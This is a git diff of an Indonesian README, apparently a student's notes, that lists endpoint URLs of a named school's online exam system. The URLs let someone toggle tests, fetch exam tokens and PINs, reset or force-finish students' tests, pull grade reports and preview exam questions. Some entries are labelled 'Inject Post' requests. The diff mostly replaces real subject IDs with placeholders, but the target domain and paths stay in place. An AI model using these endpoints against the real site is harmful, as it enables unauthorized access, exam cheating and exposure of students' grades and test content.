@@ -35,14 +35,16 @@
 </div>
 
 ---
-```ABT SMANKA pada tahun 2019-2021```
+# ABT SMANKA
+##### ABT SMANKA pada tahun 2019-2021
+Semua ini bisa berubah karena ini hanya dokumentasi selama saya sekolah
 
 ### Nonaktifkan & Aktifkan Mapel Tes
    - Nonaktifkan Mapel\
-   `sman1kaliwungu.sch.id/smanka/aktif.php?mapel=geo12vero&stat=0`
+   `sman1kaliwungu.sch.id/smanka/aktif.php?mapel=(id mapel)&stat=0`
 
    - Aktifkan Mapel\
-   `sman1kaliwungu.sch.id/smanka/aktif.php?mapel=geo12vero&stat=1`
+   `sman1kaliwungu.sch.id/smanka/aktif.php?mapel=(id mapel)&stat=1`
 
 ### Nonaktifkan & Aktifkan Acak Soal
    - Nonaktifkan Acak\
@@ -52,10 +54,10 @@
    `sman1kaliwungu.sch.id/smanka/acak2.php?stat=1`
 
 ### Ulangi Kerjakan Test Melanjutkan waktu
-   `sman1kaliwungu.sch.id/smanka/ulangi.php?ujian=(noujian/nisn)&mapel=geo12vero`
+   `sman1kaliwungu.sch.id/smanka/ulangi.php?ujian=(noujian/nisn)&mapel=(id mapel)`
    
 ### Ulangi Kerjakan Test dari nol
-   `sman1kaliwungu.sch.id/smanka/ulanginol.php?ujian=(noujian/nisn)&mapel=geo12vero`
+   `sman1kaliwungu.sch.id/smanka/ulanginol.php?ujian=(noujian/nisn)&mapel=(id mapel)`
 
 ### Ambil Token Ujian
    `sman1kaliwungu.sch.id/smanka/ambiltoken.php`
@@ -64,8 +66,8 @@
    `sman1kaliwungu.sch.id/smanka/pin.php`
 
 ### Ambil Analisis
-   `sman1kaliwungu.sch.id/smanka/analisis.php?kirim=0geo12vero`\
-   `sman1kaliwungu.sch.id/smanka/ulanganexcel.php?kirim=0geo12verov`
+   `sman1kaliwungu.sch.id/smanka/analisis.php?kirim=(tipe soal dan id mapel)`\
+   `sman1kaliwungu.sch.id/smanka/ulanganexcel.php?kirim=(tipe soal dan id mapel)`
 
 ### Login Ujian Tanpa APK
    `sman1kaliwungu.sch.id/smanka/and.php`
@@ -114,49 +116,49 @@
 
 ### Cetak Nilai
    `sman1kaliwungu.sch.id/smanka/cetak.php`\
-   `sman1kaliwungu.sch.id/smanka/ulanganexcel.php?kirim=0geo12vero`
-   `sman1kaliwungu.sch.id/smanka/pdf/ujian7.php?mapel=geo12vero`
-   `sman1kaliwungu.sch.id/smanka/pdf/ujian.php?mapel=geo12vero`
+   `sman1kaliwungu.sch.id/smanka/ulanganexcel.php?kirim=(tipe soal dan id mapel)`
+   `sman1kaliwungu.sch.id/smanka/pdf/ujian7.php?mapel=(id mapel)`
+   `sman1kaliwungu.sch.id/smanka/pdf/ujian.php?mapel=(id mapel)`
 
 ### Cek Laporan nilai
    `sman1kaliwungu.sch.id/smanka/laporan.php`
    > Post Body
    >
-   > kirim=0geo12vero
+   > kirim=(tipe soal dan id mapel)
 
 ### Cek Siswa belum tes
    `sman1kaliwungu.sch.id/smanka/belumtest.php`
    > Post Body
    >
-   > kirim=geo12vero
+   > kirim=(tipe soal dan id mapel)
 
 ### Paksa Selesai
    - Paksa Semua
       `sman1kaliwungu.sch.id/smanka/paksasemuanya.php?kirim`
    - Paksa Beberapa siswa
-      `sman1kaliwungu.sch.id/smanka/paksaselesai.php?user=(no ujian/nisn)&id=geo12vero`
+      `sman1kaliwungu.sch.id/smanka/paksaselesai.php?user=(no ujian/nisn)&id=(id mapel)`
 
 ### Cek Raport
    - Metode Inject Post\
       `sman1kaliwungu.sch.id/smanka/raport.php`
       > Post Body
       >
-      > kirim=0geo12vero
+      > kirim=(tipe soal dan id mapel)
    - Metode Inject Post\
       `sman1kaliwungu.sch.id/smanka/reportnya.php`
       > Post Body
       >
-      >  kirim=0geo12vero
+      >  kirim=(tipe soal dan id mapel)
 
 ### Reset Peserta
    `sman1kaliwungu.sch.id/smanka/reset.php`\
-   `sman1kaliwungu.sch.id/smanka/reset1.php?user=(noujian/nisn)&id=geo12vero`\
-   `sman1kaliwungu.sch.id/smanka/reset2.php?user=(noujian/nisn)&id=geo12vero`\
-   `sman1kaliwungu.sch.id/smanka/reset12.php?user=(noujian/nisn)&id=geo12vero`\
+   `sman1kaliwungu.sch.id/smanka/reset1.php?user=(noujian/nisn)&id=(id mapel)`\
+   `sman1kaliwungu.sch.id/smanka/reset2.php?user=(noujian/nisn)&id=(id mapel)`\
+   `sman1kaliwungu.sch.id/smanka/reset12.php?user=(noujian/nisn)&id=(id mapel)`\
 
 
 
-> ### Keterangan
+### Keterangan
 >
 > - ``geo12vero = ID Mapel``
 > - ``0geo12vero = Tipe Soal + ID Mapel = 0 + geo12vero``
@@ -168,6 +170,7 @@
 >> - ``4 = Untuk Soal PG``
 
 ## Tipe Soal + ID Mapel
+`Bisa berubah tidak sama karena pasti berbeda jadi jangan jadi patokan`
 Mapel             = Tipe Soal + ID mapel
 
 
@@ -189,7 +192,7 @@ Geografi          = 0 + geo12vero
 
 
 
-# Contoh Soal PAS Tahun 2020
+## Contoh Soal PAS Tahun 2020
 **Soal Biologi**\
 `sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=biolm12dewi&nomer=1&jml=40&sp=&batas=40`
 
